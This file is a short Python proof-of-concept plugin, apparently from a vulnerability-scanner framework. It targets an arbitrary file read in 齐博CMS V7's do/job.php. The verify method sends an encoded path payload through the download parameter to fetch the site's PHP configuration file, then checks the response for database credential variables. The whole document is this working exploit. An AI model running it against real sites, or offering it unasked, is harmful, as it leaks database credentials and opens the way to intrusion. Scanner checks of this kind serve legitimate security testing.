from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import requests

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "齐博CMS V7 job.php 任意文件读取"
        self.app_name = '齐博CMS'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        payload = "ZGF0YS9jb25maWcucGg8"
        test_url = target.rstrip('/') + '/do/job.php?job=download&url=' + payload

        try:
            resp = requests.get(test_url, timeout=10, verify=False)
            if resp.status_code == 200:
                # 检测响应是否为 PHP 配置文件
                if '<?php' in resp.text and ('$webdb' in resp.text or '$dbuser' in resp.text or 'database' in resp.text.lower()):
                    self.logger.info("发现齐博CMS V7 任意文件读取漏洞")
                    return test_url
        except Exception:
            pass

        return None